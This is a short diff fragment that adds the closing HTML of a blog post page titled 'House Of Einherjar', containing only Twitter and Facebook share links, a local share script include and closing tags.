+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + House%20Of%20Einherjar + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F03%2F18%2FHouse-Of-Einherjar%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/03/18/House-Of-Einherjar/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
